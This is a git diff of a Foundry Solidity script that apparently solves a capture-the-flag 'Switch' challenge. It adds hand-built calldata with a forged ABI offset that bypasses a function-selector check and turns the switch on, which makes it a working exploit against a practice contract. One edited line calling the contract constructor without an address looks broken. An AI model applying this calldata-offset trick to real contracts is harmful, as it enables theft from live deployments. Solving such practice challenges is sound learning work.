@@ -28,10 +28,11 @@ contract Test {
 
 contract SwitchSolver is Script {
 	
-	// Switch public instance = Switch(0x9CA90eE54Ce749d00eF4D334c2D9C250b5027B04);
-	Switch public instance = new Switch();
-    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()")); // 543190549 0x20606e15
-    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()")); // 1981971986 0x76227e12
+	Switch public instance = Switch();
+	// Switch public instance = new Switch();
+	bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()")); // 543190549 0x20606e15
+	bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()")); // 1981971986 0x76227e12
+	bytes4 public flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
 
 	uint256 prv = vm.envUint("PRV");
 	address me = vm.envAddress("PUB");
@@ -40,6 +41,27 @@ contract SwitchSolver is Script {
 
 		vm.startBroadcast(prv);
 
+		
+		bytes memory Xploit = bytes.concat(
+			bytes4(flipSelector),
+			bytes32(uint256(0x60)),
+			bytes32(uint256(4)),
+			bytes32(offSelector),
+			bytes32(uint256(4)),
+			bytes32(offSelector),
+			bytes32(uint256(4)),
+			bytes4(onSelector)
+		);
+
+		console.logBytes(Xploit);
+
+
+
+		console.log(instance.switchOn());
+
+		address(instance).call(Xploit);
+
+		console.log(instance.switchOn());
 
 
 
